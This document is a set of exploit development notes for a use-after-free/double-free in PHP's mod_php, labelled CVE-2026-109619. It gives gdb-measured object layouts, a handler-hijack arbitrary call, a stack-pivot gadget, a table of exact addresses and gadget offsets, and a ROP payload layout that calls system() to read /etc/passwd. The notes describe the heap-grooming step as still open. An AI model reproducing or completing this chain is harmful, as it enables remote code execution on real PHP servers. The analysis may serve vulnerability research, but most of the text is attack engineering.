# Exploit Development Findings (CVE-2026-109619)

Live gdb measurements against the built target (`php-rce-stale:8.5.11`,
mod_php, run under `setarch -R` for deterministic addresses).

## 1. Confirmed primitive (deterministic)

Producer (`GET /fatal.php`) raises a fatal error; `zend_fetch_debug_backtrace()`
stores a request-owned **packed** array in `EG(last_fatal_error_backtrace)`.
`fast_shutdown = is_zend_mm() && !EG(full_tables_cleanup)` is always `true`
(`full_tables_cleanup` is only set by `dl()`), so the reset in
`zend_shutdown_executor_values()` (`Zend/zend_execute_API.c:309`) never runs.
The worker therefore keeps a dangling `zval`:

```
(gdb) p &executor_globals->last_fatal_error_backtrace
$1 = (zval *) 0x1b0                      # offset of the zval inside EG
zval type_info=775 (IS_ARRAY)  arr=0x7ffff72570e0   (the stale HashTable header)
```

Consumer: the **next** fatal error's `zend_error_zstr_at()` begins with
`zval_ptr_dtor(&EG(last_fatal_error_backtrace))` (`Zend/zend.c:1501`), i.e. it
destroys the already-freed backtrace -> UAF / double-free.

## 2. Backtrace object layout (measured)

`zend_array` (HashTable) = 56 bytes; `Bucket` = 32; `zval` = 16;
`zend_string` = 32-byte header + data.

The backtrace is **packed** (`flags=0x14` = `HASH_FLAG_PACKED|HASH_FLAG_STATIC_KEYS`):

```
ht @ 0x7ffff72570e0:
  +0x00 gc.refcount=1   gc.type_info=7 (IS_ARRAY)
  +0x08 u.flags=0x14    nTableMask=0xfffffffe
  +0x10 arData(arPacked)=0x7ffff7293008
  +0x18 nNumUsed=42  nNumOfElements=42
  +0x20 nTableSize=64  nInternalPointer=0
  +0x28 nNextFreeElement=42
  +0x30 pDestructor = zval_ptr_dtor (0x7ffff4b605f0)
```

`zend_array_destroy()` takes the **packed** path and walks `arData` as **16-byte
zvals** (not 32-byte buckets):

```
zval *zv = arPacked; zval *end = zv + nNumUsed;
do { i_zval_ptr_dtor(zv); } while (++zv != end);
```

So the dangling pointer chain is: `EG(last_fatal_error_backtrace).arr = H`
(56B header) -> `H->arData = D` (64 * 16 = 1024B packed zval array).

## 3. Arbitrary call target: object handler hijack

`i_zval_ptr_dtor` on a controlled `IS_OBJECT` zval does
`OBJ_RELEASE(obj)` -> `zend_objects_store_del(obj)`, which performs the indirect
call (disassembly of `zend_objects_store_del`, `0x7ffff4b4a710`):

```
+46  mov 0x18(%rbx),%rdx      ; rdx = object->handlers
+96  mov %rbx,%rdi            ; rdi = object
+102 call *0x8(%rdx)          ; call handlers->free_obj(object)
```

At the call site: `rdi = object`, `rsi = object|1`, `rdx = handlers`, `rbx = object`.
`free_obj(object)` is the arbitrary call.

`zend_object` = 56 bytes: `handle@0x08, ce@0x10, handlers@0x18, properties@0x20`.
`zend_object_handlers`: `offset@0x00, free_obj@0x08, dtor_obj@0x10`.

### NX-safe stack pivot

`system(object)` is blocked by the gc prefix (`object[0]` must be `refcount=1`,
so the "command" starts with `\x01`). Instead we pivot with `jump_fcontext`
(`libphp+0x5fb8ae` = `mov %rdi,%rsp`):

```
+0x5fb8ab  mov %rsp,%rax
+0x5fb8ae  mov %rdi,%rsp        ; rsp = object
+0x5fb8b1  mov 0x40(%rsp),%r8   ; r8 = [object+0x40]  (first ROP gadget)
+0x5fb8b6  ldmxcsr (%rsp)       ; [object+0x00] = refcount (0x1, valid MXCSR)
+0x5fb8ba  fldcw 0x4(%rsp)      ; [object+0x04] = type (0x8, valid FCW)
+0x5fb8be..mov 0x10..0x38(%rsp) ; restore r12..rbp
+0x5fb8dc  lea 0x48(%rsp),%rsp  ; rsp = object+0x48  (ROP chain)
+0x5fb8e7  jmp *%r8
```

So `handlers->free_obj = pivot`, `[object+0x40] = pop rdi; ret`,
`object+0x48` = ROP chain.

## 4. Addresses (deterministic under `setarch -R`)

Re-measured 2026-10-22 (libc base shifted -0x1000 vs the earlier build; offsets
unchanged).

| Symbol | Address |
|--------|---------|
| libphp base | `0x7ffff4400000` |
| libc base | `0x7ffff7cd4000` |
| `system` | `0x7ffff7d20490` |
| `zval_ptr_dtor` | `0x7ffff4b605f0` |
| pivot (`jump_fcontext+0x2e`) | `0x7ffff49fb8ae` |
| `pop rdi; ret` (libc+0x277e5) | `0x7ffff7cfb7e5` |
| `ret` (dtor_obj, libc+0x277e6) | `0x7ffff7cfb7e6` |
| `executor_globals` | `0x7ffff5b40fc0` |
| stale backtrace header H | `0x7ffff72570e0` |
| stale backtrace arData D | `0x7ffff7293008` |

## 5. Open blocker

`H` (the 56-byte header) is what the consumer destroys. Two consumers were
analyzed:

1. **INI diagnostic** (`php_flag report_memleaks off`, fired in `apply_config()`
   before `php_request_startup()`): `H` is *not* reallocated yet, so the consumer
   double-frees the intact backtrace -> `zend_mm_heap corrupted` (confirmed
   crash), but the header fields are the original valid array (no `pDestructor`
   control).
2. **Second fatal error** (body parsed first): request startup allocates the
   autoglobal array (`$_POST`/`$_GET`, 56 bytes) which reallocates `H` *before*
   the consumer runs, so the consumer destroys a valid autoglobal array
   (harmless), and `D` is likewise reallocated by the body strings before the
   consumer.

### 5.1 Double-free detection (the actual crash)

gdb panic backtrace of the deterministic consumer crash:

```
#0 zend_mm_panic
#1 0x7ffff45ac61f (_erealloc.cold -> zend_alloc.c:1706  ZEND_MM_CHECK(chunk->heap == heap))
#2 _efree (zend_alloc.c:2794)
#3 zend_array_destroy (ht=0x7ffff72031f8)   # frame "args" array
#4 i_zval_ptr_dtor  (zval_ptr=0x7ffff7204320)
#5 zend_array_destroy (ht=0x7ffff72031c0)   # frame array
#7 zend_array_destroy (ht=0x7ffff7203150)   # H (the backtrace header)
```

Measured heap state (deterministic, `setarch -R`): `heap=0x7ffff7200040`,
`main_chunk=0x7ffff7200000`, `chunks_count=1`, `cached_chunks_count=0`,
`main_chunk->heap == heap`. So the whole backtrace (H, D, frames, arg strings)
lives in the **single main 2MB chunk**, and the `chunk->heap == heap` check does
*not* fire on the free itself.

Net mechanism: the consumer's `zend_array_destroy(H)` re-frees the backtrace's
"file"/arg strings (refcount already 0 from the heap reset), putting their
56-byte chunks on the per-bin free list a second time (LIFO cycle). The worker
does **not** abort on that free; it aborts slightly later, when the next
`emalloc`/`erealloc` walks the corrupted bin and `ZEND_MM_CHECK(chunk->heap == heap)`
fails in `zend_mm_realloc_heap` (the cold `_erealloc.cold` panic site).

### 5.2 Consequence for exploitation

The double-free creates a **free-list cycle** in the 56-byte bin (aliasing is
possible), but the Zend MM detects the corruption on the next alloc/realloc of
that bin and aborts before any attacker-controlled allocation can reuse the
aliased slot. To turn this into an arbitrary call:

1. the producer's controlled backtrace string must land in the main chunk
   (it does, `chunks_count==1`);
2. the exploit must consume the aliased 56-byte slot with an attacker-controlled
   allocation **before** the allocator re-checks the bin — i.e. inside the same
   consumer request between `apply_config()` (the double-free) and the script.

This is the remaining heap-feng-shui step (T-08..T-11): place the ROP payload
from `rop.py` into the aliased slot via the request body and trigger the
`free_obj` call before shutdown's corruption check.

## 6. ROP payload layout (for the object-hijack path)

Once `D` (or `H`) is under control, place in it (all offsets from the groomed
buffer base, packed-zval view):

```
zv[0]  : skip (type byte != 6/7/8)
zv[1]  : skip (type byte = 0)
zv[2]  : value = &fake_object ; type = IS_OBJECT(8)
fake_object:  refcount=1, type=IS_OBJECT, handle=0, ce=0,
              handlers=&fake_handlers, properties=0,
              +0x40 = pop rdi; ret, +0x48 = &cmd, +0x50 = system
fake_handlers: offset=0, free_obj=pivot, dtor_obj=ret
cmd     : "cat /etc/passwd\x00"
```
